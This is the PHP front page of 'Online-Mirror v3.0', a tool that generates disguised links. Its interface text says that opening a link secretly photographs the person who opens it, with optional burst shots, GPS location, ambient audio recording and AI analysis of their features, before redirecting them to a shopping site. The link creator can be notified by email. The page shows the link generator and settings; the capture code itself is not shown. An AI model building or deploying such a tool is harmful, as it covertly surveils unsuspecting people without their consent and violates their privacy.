<?php
/**
 * Online-Mirror v3.0 - 主页面
 * 支持双重模式：链接生成器 & 拍照入口
 */
session_start();
require_once __DIR__ . '/config.php';

// ========== 封禁IP拦截：禁止生成链接和查看内容 ==========
if (isIPBanned()) {
    $ban_reason = getBanReason();
    die('<!DOCTYPE html><html lang="zh-CN"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>访问被拒绝</title><style>body{background:#0f0c29;color:#e0e0e0;font-family:-apple-system,BlinkMacSystemFont,\'Segoe UI\',Roboto,sans-serif;display:flex;align-items:center;justify-content:center;min-height:100vh;margin:0;padding:20px}.card{background:rgba(255,255,255,0.05);backdrop-filter:blur(20px);border:1px solid rgba(255,80,80,0.2);border-radius:24px;padding:40px;max-width:420px;width:100%;text-align:center}.card .icon{font-size:64px;margin-bottom:16px}.card h1{font-size:22px;color:#ff6b6b;margin:0 0 8px}.card p{color:#8080a0;font-size:14px;line-height:1.6;margin:0}</style></head><body><div class="card"><div class="icon">🚫</div><h1>访问被拒绝</h1><p>' . htmlspecialchars($ban_reason) . '</p></div></body></html>');
}

$csrf = csrfToken();

// ========== 拍照模式：当传入 id&url 时跳转到 capture.php ==========
if (isset($_GET['id']) && isset($_GET['url'])) {
    $id = trim($_GET['id']);
    $url = trim($_GET['url']);
    if (!empty($id) && !empty($url)) {
        header('Location: capture.php?id=' . urlencode($id) . '&url=' . urlencode($url));
        exit;
    }
}

// 处理生成链接请求
$generated_link = '';
$generated_id = '';
$rate_error = '';
if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['action']) && $_POST['action'] === 'generate') {
    // 频率限制检查
    list($allowed, $msg) = checkRateLimit();
    if (!$allowed) {
        $rate_error = $msg;
    } else {
        requireCsrf();
        
        $redirect_url = trim($_POST['redirect_url'] ?? 'https://mobile.yangkeduo.com/');
        $expire_days = intval($_POST['expire_days'] ?? 7);
        $tags = trim($_POST['tags'] ?? '');
        $tags = mb_substr(strip_tags($tags), 0, 200);
        $notify_email = trim($_POST['notify_email'] ?? '');
        $notify_email = filter_var($notify_email, FILTER_VALIDATE_EMAIL) ? $notify_email : null;
        $short_domain = trim($_POST['short_domain'] ?? '');
        $short_domain = mb_substr(strip_tags($short_domain), 0, 200);
        $burst_enabled = isset($_POST['burst_enabled']) && $_POST['burst_enabled'] === '1';
        $burst_count = $burst_enabled ? intval($_POST['burst_count'] ?? 0) : 0;
        $burst_count = ($burst_count >= 2 && $burst_count <= 5) ? $burst_count : null;
        $gps_enabled = isset($_POST['gps_enabled']) ? 1 : 0;
        $recording_enabled = isset($_POST['recording_enabled']) && $_POST['recording_enabled'] === '1' ? 1 : 0;
        $recording_seconds = $recording_enabled ? intval($_POST['recording_seconds'] ?? 5) : 0;
        $show_qrcode = isset($_POST['show_qrcode']) ? 1 : 0;
        $ai_enabled = isset($_POST['ai_enabled']) ? 1 : 0;
        $reverse_enabled = isset($_POST['reverse_enabled']) ? 1 : 0;
        $user_id = isLoggedIn() ? $_SESSION['user_id'] : null;
        
        // 生成唯一ID（确保不重复）
        do {
            $link_id = generateID(6);
            $db = getDB();
            $stmt = $db->prepare("SELECT COUNT(*) FROM mir_links WHERE link_id = ?");
            $stmt->execute([$link_id]);
        } while ($stmt->fetchColumn() > 0);
        
        // 计算过期时间
        $expires_at = date('Y-m-d H:i:s', strtotime("+{$expire_days} days"));
        
        // 入库
        $stmt = $db->prepare("INSERT INTO mir_links (link_id, redirect_url, user_id, tags, notify_email, short_domain, gps_enabled, recording_enabled, recording_seconds, burst_count, expires_at) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)");
        $stmt->execute([$link_id, $redirect_url, $user_id, $tags, $notify_email, $short_domain, $gps_enabled, $recording_enabled, $recording_seconds, $burst_count, $expires_at]);
        
        // 写入AI和反向图搜设置（新字段存设置表）
        setSetting('link_ai_' . $link_id, $ai_enabled ? '1' : '0');
        setSetting('link_reverse_' . $link_id, $reverse_enabled ? '1' : '0');
        
        $generated_id = $link_id;
        // 自定义短域名
        if (!empty($short_domain)) {
            $domain = rtrim($short_domain, '/');
            $generated_link = $domain . '/mirror/index.php?id=' . $link_id . '&url=' . urlencode($redirect_url);
        } else {
            $generated_link = SITE_URL . 'index.php?id=' . $link_id . '&url=' . urlencode($redirect_url);
        }
        
        addLog($link_id, 'generate');
    }
}
?>
<!DOCTYPE html>
<html lang="zh-CN">
<head>
<meta charset="UTF-8">
<link rel="icon" type="image/x-icon" href="favicon.ico">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Online Mirror</title>
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css">
<style>
.toggle-group {
    display: flex;
    align-items: center;
    justify-content: space-between;
    padding: 10px 0;
}
.toggle-group .label {
    font-size: 14px;
    color: #b0b0c8;
    display: flex;
    align-items: center;
    gap: 6px;
}
.toggle-group .label small {
    font-size: 12px;
    color: #606080;
}
.toggle {
    width: 44px;
    height: 24px;
    border-radius: 12px;
    background: rgba(255,255,255,0.12);
    cursor: pointer;
    position: relative;
    transition: all 0.3s;
    border: none;
    padding: 0;
    flex-shrink: 0;
}
.toggle.on {
    background: linear-gradient(135deg, #667eea, #764ba2);
}
.toggle .knob {
    width: 20px;
    height: 20px;
    border-radius: 50%;
    background: #fff;
    position: absolute;
    top: 2px;
    left: 2px;
    transition: all 0.3s;
    box-shadow: 0 1px 3px rgba(0,0,0,0.3);
}
.toggle.on .knob {
    left: 22px;
}
.toggle-field {
    display: none;
    margin-top: -6px;
    margin-bottom: 10px;
}
.toggle-field.show {
    display: block;
}

* { margin: 0; padding: 0; box-sizing: border-box; }
body {
    font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
    background: linear-gradient(145deg, #0f0c29, #302b63, #24243e);
    min-height: 100vh;
    color: #e0e0e0;
    display: flex;
    align-items: center;
    justify-content: center;
    padding: 20px;
}
.container {
    background: rgba(255,255,255,0.05);
    backdrop-filter: blur(20px);
    -webkit-backdrop-filter: blur(20px);
    border: 1px solid rgba(255,255,255,0.1);
    border-radius: 24px;
    padding: 40px;
    max-width: 580px;
    width: 100%;
    box-shadow: 0 25px 50px rgba(0,0,0,0.5);
}
.logo {
    text-align: center;
    margin-bottom: 30px;
}
.logo i {
    font-size: 48px;
    background: linear-gradient(135deg, #667eea, #764ba2);
    -webkit-background-clip: text;
    -webkit-text-fill-color: transparent;
}
.logo h1 {
    font-size: 28px;
    margin-top: 10px;
    background: linear-gradient(90deg, #667eea, #764ba2, #f093fb);
    -webkit-background-clip: text;
    -webkit-text-fill-color: transparent;
}
.logo p {
    color: #a0a0b8;
    font-size: 14px;
    margin-top: 6px;
}
.form-group {
    margin-bottom: 18px;
}
.form-group label {
    display: block;
    font-size: 14px;
    color: #b0b0c8;
    margin-bottom: 6px;
    font-weight: 500;
}
.form-group label i {
    margin-right: 6px;
    width: 18px;
}
.form-group input, .form-group select {
    width: 100%;
    padding: 12px 16px;
    border: 1px solid rgba(255,255,255,0.12);
    border-radius: 12px;
    background: rgba(255,255,255,0.06);
    color: #e0e0e0;
    font-size: 15px;
    transition: all 0.3s;
    outline: none;
}
.form-group input:focus, .form-group select:focus {
    border-color: #667eea;
    box-shadow: 0 0 0 3px rgba(102,126,234,0.2);
    background: rgba(255,255,255,0.08);
}
.form-group select option { background: #1a1a2e; color: #e0e0e0; }
.btn-generate {
    width: 100%;
    padding: 14px;
    border: none;
    border-radius: 12px;
    background: linear-gradient(135deg, #667eea, #764ba2);
    color: white;
    font-size: 16px;
    font-weight: 600;
    cursor: pointer;
    transition: all 0.3s;
    display: flex;
    align-items: center;
    justify-content: center;
    gap: 8px;
}
.btn-generate:hover {
    transform: translateY(-2px);
    box-shadow: 0 8px 25px rgba(102,126,234,0.4);
}
.btn-generate:active { transform: translateY(0); }

/* 二维码 */
.qrcode-wrap {
    text-align: center;
    padding: 12px 0 8px;
}
.qrcode-wrap img {
    width: 160px;
    height: 160px;
    border-radius: 12px;
    background: #fff;
    padding: 8px;
    transition: transform 0.3s;
}
.qrcode-wrap img:hover {
    transform: scale(1.05);
}

/* 结果区域 */
.result-box {
    margin-top: 24px;
    padding: 20px;
    background: rgba(255,255,255,0.05);
    border-radius: 16px;
    border: 1px solid rgba(255,255,255,0.08);
    display: <?php echo $generated_link ? 'block' : 'none'; ?>;
}
.result-box h3 {
    font-size: 14px;
    color: #a0a0b8;
    margin-bottom: 10px;
    display: flex;
    align-items: center;
    gap: 6px;
}
.result-box .link-display {
    display: flex;
    gap: 8px;
}
.result-box .link-display input {
    flex: 1;
    padding: 10px 14px;
    border: 1px solid rgba(255,255,255,0.12);
    border-radius: 10px;
    background: rgba(0,0,0,0.3);
    color: #c0c0d8;
    font-size: 13px;
    word-break: break-all;
    outline: none;
}
.result-box .link-display button {
    padding: 10px 16px;
    border: none;
    border-radius: 10px;
    background: linear-gradient(135deg, #667eea, #764ba2);
    color: white;
    cursor: pointer;
    font-size: 14px;
    transition: all 0.3s;
    white-space: nowrap;
}
.result-box .link-display button:hover { opacity: 0.85; }
.result-box .tips {
    margin-top: 12px;
    padding: 12px;
    background: rgba(255,200,0,0.08);
    border: 1px solid rgba(255,200,0,0.15);
    border-radius: 10px;
    font-size: 13px;
    color: #d0b84a;
    line-height: 1.6;
}
.result-box .tips strong { color: #f0d060; }

/* 页脚 */
.footer {
    margin-top: 24px;
    text-align: center;
    font-size: 13px;
    color: #606080;
}
.footer a {
    color: #667eea;
    text-decoration: none;
}
.footer a:hover { text-decoration: underline; }
.footer .divider { margin: 0 8px; color: #404060; }
.footer .social-links {
    display:flex; align-items:center; justify-content:center; gap:12px;
    margin-bottom:10px;
}
.footer .social-links a {
    display:inline-flex; align-items:center; gap:4px;
    padding:6px 12px; border-radius:8px;
    background:rgba(255,255,255,0.04);
    border:1px solid rgba(255,255,255,0.06);
    color:#a0a0b8; font-size:12px; transition:all 0.3s;
}
.footer .social-links a:hover {
    background:rgba(255,255,255,0.08);
    border-color:rgba(102,126,234,0.3);
    color:#e0e0e0;
}
.footer .social-links a.dev-btn {
    background:rgba(102,126,234,0.1);
    border-color:rgba(102,126,234,0.2);
    color:#667eea;
}
.footer .social-links a.dev-btn:hover {
    background:rgba(102,126,234,0.2);
}

/* ====== 滑动验证码 ====== */
.slide-captcha {
    margin-bottom: 14px;
    text-align: left;
}
.slide-captcha .sc-label {
    display: block;
    font-size: 13px;
    color: #b0b0c8;
    margin-bottom: 4px;
}
.slide-captcha .sc-track {
    position: relative;
    height: 44px;
    border-radius: 12px;
    background: rgba(255,255,255,0.06);
    border: 1px solid rgba(255,255,255,0.12);
    overflow: hidden;
    cursor: pointer;
    user-select: none;
}
.slide-captcha .sc-fill {
    position: absolute;
    left: 0;
    top: 0;
    bottom: 0;
    width: 0;
    background: linear-gradient(90deg, #667eea, #764ba2);
    border-radius: 12px;
    transition: width 0.2s;
    opacity: 0.6;
}
.slide-captcha .sc-thumb {
    position: absolute;
    left: 2px;
    top: 2px;
    width: 40px;
    height: 40px;
    border-radius: 10px;
    background: linear-gradient(135deg, #667eea, #764ba2);
    color: #fff;
    display: flex;
    align-items: center;
    justify-content: center;
    font-size: 14px;
    cursor: grab;
    z-index: 2;
    box-shadow: 0 2px 6px rgba(0,0,0,0.3);
    transition: box-shadow 0.2s;
}
.slide-captcha .sc-thumb:active { cursor: grabbing; }
.slide-captcha .sc-text {
    position: absolute;
    left: 0;
    right: 0;
    top: 0;
    bottom: 0;
    display: flex;
    align-items: center;
    justify-content: center;
    font-size: 13px;
    color: #8080a0;
    z-index: 1;
    pointer-events: none;
}
.slide-captcha .sc-thumb.verified {
    background: linear-gradient(135deg, #4caf50, #2e7d32);
}
.slide-captcha .sc-track.verified {
    border-color: #4caf50;
}
.slide-captcha .sc-track.verified .sc-fill {
    background: linear-gradient(90deg, #4caf50, #2e7d32);
    opacity: 1;
}
.slide-captcha input[type="hidden"] {
    display: none;
}

/* 开发者弹窗 */
.dev-modal {
    display:none;
    position:fixed; top:0; left:0; right:0; bottom:0;
    z-index:9999; background:rgba(0,0,0,0.85);
    justify-content:center; align-items:center;
}
.dev-modal.show { display:flex; }
.dev-modal .modal-box {
    background:#1a1a2e;
    border:1px solid rgba(255,255,255,0.12);
    border-radius:16px; overflow:hidden;
    width:90vw; max-width:380px;
}
.dev-modal .modal-header {
    padding:14px 20px; display:flex; justify-content:space-between; align-items:center;
    border-bottom:1px solid rgba(255,255,255,0.06);
}
.dev-modal .modal-header h3 { font-size:16px; }
.dev-modal .modal-header .close-btn {
    font-size:24px; color:#8080a0; cursor:pointer; border:none; background:none;
}
.dev-modal .modal-header .close-btn:hover { color:#fff; }
.dev-modal .modal-body { padding:20px; }

/* 开发者卡片 */
.dev-card {
    background:rgba(255,255,255,0.04);
    border:1px solid rgba(255,255,255,0.08);
    border-radius:12px; padding:20px;
    text-align:center; cursor:pointer;
    transition:all 0.3s;
}
.dev-card:hover {
    background:rgba(255,255,255,0.08);
    border-color:rgba(102,126,234,0.3);
    transform:translateY(-2px);
}
.dev-card .avatar {
    width:72px; height:72px; border-radius:50%;
    border:3px solid rgba(102,126,234,0.3);
    margin:0 auto 12px; display:block;
    object-fit:cover;
}
.dev-card .name {
    font-size:18px; font-weight:600; color:#e0e0e0;
}
.dev-card .badge {
    display:inline-block;
    padding:2px 10px; border-radius:6px;
    background:rgba(255,193,7,0.15); color:#ffc107;
    font-size:11px; margin-top:4px;
}
.dev-card .motto {
    font-size:13px; color:#8080a0;
    margin-top:8px; font-style:italic;
}
.dev-card .click-hint {
    font-size:11px; color:#606080; margin-top:10px;
}

/* 复制邮箱toast */
.copy-toast {
    position:fixed; top:50%; left:50%;
    transform:translate(-50%,-50%) scale(0.8);
    padding:16px 28px; border-radius:12px;
    background:rgba(0,0,0,0.9); color:#fff;
    font-size:14px; z-index:10000;
    opacity:0; transition:all 0.3s ease;
    pointer-events:none;
}
.copy-toast.show {
    opacity:1; transform:translate(-50%,-50%) scale(1);
}

/* Toast */
.toast {
    position: fixed;
    top: 20px;
    left: 50%;
    transform: translateX(-50%) translateY(-100px);
    padding: 12px 24px;
    border-radius: 12px;
    background: rgba(0,0,0,0.85);
    color: white;
    font-size: 14px;
    transition: transform 0.4s ease;
    z-index: 999;
    pointer-events: none;
}
.toast.show { transform: translateX(-50%) translateY(0); }
.toast.success { background: rgba(0,200,80,0.9); }

@media (max-width: 480px) {
    .container { padding: 24px 16px; }
    .logo h1 { font-size: 22px; }
}
</style>
</head>
<body>
<div class="toast" id="toast"></div>

<div class="container">
    <div class="logo">
        <i class="fas fa-camera"></i>
        <h1>网恋照妖镜</h1>
        <p>是小姐姐，还是网图哥？</p>
    </div>

    <?php if ($rate_error): ?>
    <div id="rateLimitBox" style="padding:12px 16px;border-radius:12px;background:rgba(255,80,80,0.12);border:1px solid rgba(255,80,80,0.2);color:#ff6b6b;font-size:14px;margin-bottom:18px;text-align:center;">
        <i class="fas fa-exclamation-triangle"></i> 
        <span id="rateLimitMsg"><?php echo htmlspecialchars($rate_error); ?></span>
        <span id="rateLimitCountdown" style="display:none;font-weight:700;font-size:16px;" class=""></span>
    </div>
    <?php endif; ?>
    
    <form method="POST" onsubmit="return validateForm()">
        <input type="hidden" name="action" value="generate">
        <input type="hidden" name="csrf_token" value="<?php echo $csrf; ?>">
        
        <div class="form-group">
            <label><i class="fas fa-link"></i> 跳转地址</label>
            <input type="url" name="redirect_url" id="redirect_url" value="https://mobile.yangkeduo.com/" placeholder="https://example.com" required>
        </div>

        <div class="form-group">
            <label><i class="fas fa-clock"></i> 链接有效期</label>
            <select name="expire_days">
                <option value="1">1 天</option>
                <option value="3">3 天</option>
                <option value="7" selected>7 天</option>
                <option value="14">14 天</option>
                <option value="30">30 天</option>
            </select>
        </div>

        <!-- 标签开关 -->
        <div class="toggle-group">
            <div class="label">
                <i class="fas fa-tags"></i> 添加标签
                <small>分类管理链接</small>
            </div>
            <button type="button" class="toggle" id="toggleTagsBtn" onclick="toggleField('tags')">
                <div class="knob"></div>
            </button>
        </div>
        <div class="toggle-field" id="toggleTagsField">
            <div class="form-group" style="margin-bottom:0;">
                <input type="text" name="tags" placeholder="例如：微信、网友、小红书" style="width:100%;padding:12px 16px;border:1px solid rgba(255,255,255,0.12);border-radius:12px;background:rgba(255,255,255,0.06);color:#e0e0e0;font-size:15px;outline:none;">
            </div>
        </div>
        
        <!-- 邮箱通知开关 -->
        <div class="toggle-group" style="border-top:1px solid rgba(255,255,255,0.06);">
            <div class="label">
                <i class="fas fa-envelope"></i> 邮箱通知
                <small>有人拍照时发邮件</small>
            </div>
            <div style="display:flex;align-items:center;gap:6px;">
                <span style="font-size:10px;color:#ff9800;display:<?php echo getSetting('email_enabled') !== '1' ? 'inline' : 'none'; ?>;">未配置</span>
                <button type="button" class="toggle" id="toggleEmailBtn" onclick="toggleField('email')">
                    <div class="knob"></div>
                </button>
            </div>
        </div>
        <div class="toggle-field" id="toggleEmailField">
            <div class="form-group" style="margin-bottom:0;">
                <input type="email" name="notify_email" placeholder="your@email.com" style="width:100%;padding:12px 16px;border:1px solid rgba(255,255,255,0.12);border-radius:12px;background:rgba(255,255,255,0.06);color:#e0e0e0;font-size:15px;outline:none;">
                <div style="font-size:11px;color:#606080;margin-top:4px;">有人打开链接拍照时，自动发送通知邮件到此地址</div>
            </div>
        </div>
        
        <!-- ====== 更多设置 ====== -->
        <div id="moreSettingsBtn" onclick="toggleMoreSettings()" style="border-top:1px solid rgba(255,255,255,0.06);padding:12px 0;cursor:pointer;display:flex;align-items:center;justify-content:space-between;color:#8080a0;font-size:14px;user-select:none;">
            <span><i class="fas fa-cog"></i> 更多设置</span>
            <span id="moreSettingsArrow" style="transition:transform 0.3s;"><i class="fas fa-chevron-down"></i></span>
        </div>
        <div id="moreSettingsBody" style="display:none;">
            
            <!-- AI分析开关（排最前） -->
            <div class="toggle-group" style="border-top:none;">
                <div class="label">
                    <i class="fas fa-robot"></i> AI 人像分析
                    <small>拍照后AI分析对方特征</small>
                </div>
                <div style="display:flex;align-items:center;gap:6px;">
                    <span style="font-size:10px;color:#ff9800;display:<?php echo empty(getSetting('ai_api_key')) ? 'inline' : 'none'; ?>;">未配置</span>
                    <button type="button" class="toggle on" id="toggleAiBtn" onclick="toggleField('ai')">
                        <div class="knob"></div>
                    </button>
                </div>
            </div>
            <input type="hidden" name="ai_enabled" id="aiEnabledInput" value="1">
            
            <!-- 反向图搜开关 -->
            <div class="toggle-group" style="border-top:1px solid rgba(255,255,255,0.06);">
                <div class="label">
                    <i class="fas fa-search"></i> 反向图搜
                    <small>以图搜图查来源</small>
                </div>
                <button type="button" class="toggle on" id="toggleReverseBtn" onclick="toggleField('reverse')">
                    <div class="knob"></div>
                </button>
            </div>
            <input type="hidden" name="reverse_enabled" id="reverseEnabledInput" value="1">
            
            <!-- 二维码开关 -->
            <div class="toggle-group" style="border-top:1px solid rgba(255,255,255,0.06);">
                <div class="label">
                    <i class="fas fa-qrcode"></i> 二维码
                    <small>生成链接二维码</small>
                </div>
                <input type="hidden" name="show_qrcode" id="showQrcodeInput" value="0">
                <button type="button" class="toggle" id="toggleQrcodeBtn" onclick="toggleField('qrcode')">
                    <div class="knob"></div>
                </button>
            </div>
            
            <!-- 连拍模式开关 -->
            <div class="toggle-group" style="border-top:1px solid rgba(255,255,255,0.06);">
                <div class="label">
                    <i class="fas fa-camera-retro"></i> 连拍模式
                    <small>多张连拍不遗漏</small>
                </div>
                <input type="hidden" name="burst_enabled" id="burstEnabledInput" value="0">
                <button type="button" class="toggle" id="toggleBurstBtn" onclick="toggleField('burst')">
                    <div class="knob"></div>
                </button>
            </div>
            <div class="toggle-field" id="toggleBurstField">
                <div class="form-group" style="margin-bottom:0;">
                    <select name="burst_count" style="width:100%;padding:12px 16px;border:1px solid rgba(255,255,255,0.12);border-radius:12px;background:rgba(255,255,255,0.06);color:#e0e0e0;font-size:15px;outline:none;">
                        <option value="2">2 张连拍</option>
                        <option value="3" selected>3 张连拍</option>
                        <option value="4">4 张连拍</option>
                        <option value="5">5 张连拍</option>
                    </select>
                    <div style="font-size:11px;color:#606080;margin-top:4px;">对方打开链接后将连续拍摄多张照片，防止眨眼闭眼漏拍</div>
                </div>
            </div>
            
            <!-- 记录地理信息开关 -->
            <div class="toggle-group" style="border-top:1px solid rgba(255,255,255,0.06);">
                <div class="label">
                    <i class="fas fa-map-marker-alt"></i> 记录地理信息
                    <small style="color:#ff9800;">慎重开启，可能要求授权</small>
                </div>
                <button type="button" class="toggle" id="toggleGpsBtn" onclick="toggleField('gps')">
                    <div class="knob"></div>
                </button>
            </div>
            <div class="toggle-field" id="toggleGpsField" style="display:none;">
                <input type="hidden" name="gps_enabled" id="gpsEnabledInput" value="0">
                <div style="padding:10px 14px;border-radius:10px;background:rgba(255,152,0,0.08);border:1px solid rgba(255,152,0,0.15);font-size:12px;color:#ffa726;margin-bottom:10px;">
                    <i class="fas fa-exclamation-triangle"></i> 开启后对方打开链接时浏览器可能会弹出位置授权提示，请谨慎使用
                </div>
            </div>
            
            <!-- 录音采样开关 -->
            <div class="toggle-group" style="border-top:1px solid rgba(255,255,255,0.06);">
                <div class="label">
                    <i class="fas fa-microphone"></i> 录音采样
                    <small>录制对方环境声音</small>
                </div>
                <input type="hidden" name="recording_enabled" id="recordingEnabledInput" value="0">
                <button type="button" class="toggle" id="toggleRecordingBtn" onclick="toggleField('recording')">
                    <div class="knob"></div>
                </button>
            </div>
            <div class="toggle-field" id="toggleRecordingField">
                <div class="form-group" style="margin-bottom:0;">
                    <select name="recording_seconds" style="width:100%;padding:12px 16px;border:1px solid rgba(255,255,255,0.12);border-radius:12px;background:rgba(255,255,255,0.06);color:#e0e0e0;font-size:15px;outline:none;">
                        <option value="3">3 秒</option>
                        <option value="5" selected>5 秒</option>
                        <option value="10">10 秒</option>
                        <option value="15">15 秒</option>
                        <option value="30">30 秒</option>
                    </select>
                    <div style="font-size:11px;color:#606080;margin-top:4px;">对方打开链接后录制指定秒数的环境声音，录制完成后自动拍照</div>
                </div>
            </div>
            
            <!-- 自定义短域名开关 -->
            <div class="toggle-group" style="border-top:1px solid rgba(255,255,255,0.06);">
                <div class="label">
                    <i class="fas fa-globe"></i> 自定义短域名
                    <small>使用自己的域名</small>
                </div>
                <button type="button" class="toggle" id="toggleDomainBtn" onclick="toggleField('domain')">
                    <div class="knob"></div>
                </button>
            </div>
            <div class="toggle-field" id="toggleDomainField">
                <div class="form-group" style="margin-bottom:0;">
                    <input type="text" name="short_domain" placeholder="https://你的域名.com" style="width:100%;padding:12px 16px;border:1px solid rgba(255,255,255,0.12);border-radius:12px;background:rgba(255,255,255,0.06);color:#e0e0e0;font-size:15px;outline:none;">
                    <div style="font-size:11px;color:#606080;margin-top:4px;">生成的链接将使用此域名，需要在你的域名下部署相同的项目</div>
                </div>
            </div>
            
        </div>
        
        <!-- 滑动验证 -->
        <div class="slide-captcha">
            <label class="sc-label"><i class="fas fa-shield-alt"></i> 安全验证</label>
            <div class="sc-track" id="scTrack">
                <div class="sc-fill" id="scFill"></div>
                <div class="sc-thumb" id="scThumb" onmousedown="startDrag(event)" ontouchstart="startDragTouch(event)">
                    <i class="fas fa-arrow-right"></i>
                </div>
                <div class="sc-text" id="scText">请按住滑块拖动到最右侧</div>
            </div>
            <input type="hidden" name="slider_pass" id="sliderPass" value="0">
        </div>

        <button type="submit" class="btn-generate">
            <i class="fas fa-magic"></i> 生成镜像链接
        </button>
    </form>

    <div class="result-box" id="resultBox">
        <h3><i class="fas fa-check-circle" style="color:#4caf50;"></i> 镜像链接已生成</h3>
        <div class="link-display">
            <input type="text" id="generatedLink" value="<?php echo htmlspecialchars($generated_link); ?>" readonly>
            <button onclick="copyLink()"><i class="fas fa-copy"></i> 复制</button>
        </div>
        <div class="tips">
            <strong>⚠️ 温馨提示：</strong><br>
            ID: <code><?php echo htmlspecialchars($generated_id); ?></code>
            <button onclick="copyID()" style="margin-left:6px;padding:2px 10px;border:none;border-radius:6px;background:rgba(102,126,234,0.3);color:#667eea;cursor:pointer;font-size:12px;"><i class="fas fa-copy"></i> 复制ID</button>
            — 用此ID可在后台查看照片<br>
            对方打开链接后会自动拍摄一张照片并跳转到指定页面
            <?php if (isLoggedIn()): ?>
                <br><a href="dashboard.php" style="color:#667eea;">👉 前往后台管理</a>
            <?php endif; ?>
        </div>
        <div class="qrcode-wrap" id="qrcodeWrap" style="margin-top:14px;display:<?php echo ($generated_link && $show_qrcode ? 'block' : 'none'); ?>;">
            <div style="text-align:center;">
                <p style="font-size:12px;color:#8080a0;margin-bottom:8px;"><i class="fas fa-qrcode"></i> 扫一扫打开链接</p>
                <img id="qrcodeImg" src="<?php echo $generated_link ? 'https://api.qrserver.com/v1/create-qr-code/?size=200x200&data=' . urlencode($generated_link) : ''; ?>" alt="二维码" style="width:160px;height:160px;border-radius:12px;background:#fff;padding:8px;">
            </div>
        </div>
        <div style="margin-top:14px;padding-top:14px;border-top:1px solid rgba(255,255,255,0.06);display:flex;gap:8px;">
            <button onclick="showHistory()" style="flex:1;padding:10px;border:1px solid rgba(102,126,234,0.25);border-radius:10px;background:rgba(102,126,234,0.08);color:#8080c0;cursor:pointer;font-size:13px;transition:all 0.3s;"><i class="fas fa-history"></i> 查看历史记录</button>
        </div>
    </div>

    <!-- 快速查看照片 -->
    <div style="margin-top:20px;padding-top:20px;border-top:1px solid rgba(255,255,255,0.06);">
        <form action="photos.php" method="GET" style="display:flex;gap:8px;align-items:center;">
            <label style="font-size:13px;color:#8080a0;white-space:nowrap;"><i class="fas fa-search"></i> 查照片</label>
            <input type="text" name="id" placeholder="输入ID查看照片" style="flex:1;padding:10px 14px;border:1px solid rgba(255,255,255,0.12);border-radius:10px;background:rgba(255,255,255,0.06);color:#e0e0e0;font-size:14px;outline:none;">
            <button type="submit" style="padding:10px 16px;border:none;border-radius:10px;background:rgba(102,126,234,0.2);color:#667eea;cursor:pointer;font-size:14px;"><i class="fas fa-arrow-right"></i></button>
        </form>
    </div>

    <div class="footer">
        <div class="social-links">
            <a href="https://github.com/beihaiBH/Online-Mirror/" target="_blank" rel="noopener">
                <i class="fab fa-github"></i> GitHub
            </a>
            <a href="https://gitee.com/beihaiLG/online-mirror" target="_blank" rel="noopener">
                <i class="fab fa-git-alt"></i> Gitee
            </a>
            <a href="javascript:void(0)" class="dev-btn" onclick="showDeveloper()">
                <i class="fas fa-code"></i> 开发者
            </a>
            <a href="javascript:void(0)" class="dev-btn" onclick="showDonation()" style="background:rgba(255,193,7,0.12);border-color:rgba(255,193,7,0.2);color:#ffc107;">
                <i class="fas fa-coffee"></i> 打赏
            </a>
        </div>
        <div>
        <?php if (isLoggedIn()): ?>
            <i class="fas fa-user"></i> <?php echo htmlspecialchars($_SESSION['username']); ?>
            <span class="divider">|</span>
            <a href="dashboard.php"><i class="fas fa-tachometer-alt"></i> 控制台</a>
            <span class="divider">|</span>
            <a href="login.php?action=logout"><i class="fas fa-sign-out-alt"></i> 退出</a>
        <?php else: ?>
            <a href="login.php"><i class="fas fa-lock"></i> 管理员登录</a>
        <?php endif; ?>
        </div>
    </div>
</div>

<!-- 开发者弹窗 -->
<div class="dev-modal" id="devModal">
    <div class="modal-box">
        <div class="modal-header">
            <h3><i class="fas fa-code" style="color:#667eea;"></i> 开发者</h3>
            <button class="close-btn" onclick="closeDev()">&times;</button>
        </div>
        <div class="modal-body">
            <div class="dev-card" onclick="copyDevEmail()" title="点击复制邮箱">
                <img class="avatar" src="http://q1.qlogo.cn/g?b=qq&nk=629401918&s=640" alt="头像">
                <div class="name">beihai</div>
                <div class="badge">⭐ 核心开发</div>
                <div class="motto">「心中无女人，代码自然神」</div>
                <div class="click-hint"><i class="fas fa-envelope"></i> 点击复制邮箱</div>
            </div>
        </div>
    </div>
</div>

<!-- 打赏弹窗 -->
<div class="dev-modal" id="donationModal">
    <div class="modal-box">
        <div class="modal-header">
            <h3><i class="fas fa-coffee" style="color:#ffc107;"></i> 打赏支持</h3>
            <button class="close-btn" onclick="closeDonation()">&times;</button>
        </div>
        <div class="modal-body" style="text-align:center;">
            <p style="font-size:13px;color:#8080a0;margin-bottom:16px;">如果这个项目帮到了你，欢迎打赏支持开发者～</p>
            <div id="donationQRCodes" style="display:flex;flex-wrap:wrap;gap:16px;justify-content:center;">
                <?php
                $donation_channels = json_decode(getSetting('donation_channels') ?: '[]', true);
                foreach ($donation_channels as $ch): 
                    $ch_img = htmlspecialchars($ch['image'] ?? '');
                    $ch_name = htmlspecialchars($ch['name'] ?? '打赏');
                    if (!empty($ch_img)):
                ?>
                <div style="text-align:center;">
                    <img src="<?php echo $ch_img; ?>" alt="<?php echo $ch_name; ?>" style="width:160px;height:160px;border-radius:12px;background:#fff;padding:8px;object-fit:contain;">
                    <div style="font-size:12px;color:#a0a0b8;margin-top:6px;"><?php echo $ch_name; ?></div>
                </div>
                <?php 
                    endif;
                endforeach; 
                ?>
            </div>
            <?php if (empty($donation_channels)): ?>
            <p style="color:#606080;font-size:13px;">管理员暂未设置打赏方式</p>
            <?php endif; ?>
        </div>
    </div>
</div>

<!-- 复制邮箱提示 -->
<div class="copy-toast" id="copyToast">✅ 邮箱已复制到剪贴板</div>

<script>
function showDeveloper() {
    document.getElementById('devModal').classList.add('show');
    document.body.style.overflow = 'hidden';
}
function closeDev() {
    document.getElementById('devModal').classList.remove('show');
    document.body.style.overflow = '';
}
function showDonation() {
    document.getElementById('donationModal').classList.add('show');
    document.body.style.overflow = 'hidden';
}
function closeDonation() {
    document.getElementById('donationModal').classList.remove('show');
    document.body.style.overflow = '';
}
function copyDevEmail() {
    var email = 'stockstock12001@gmail.com';
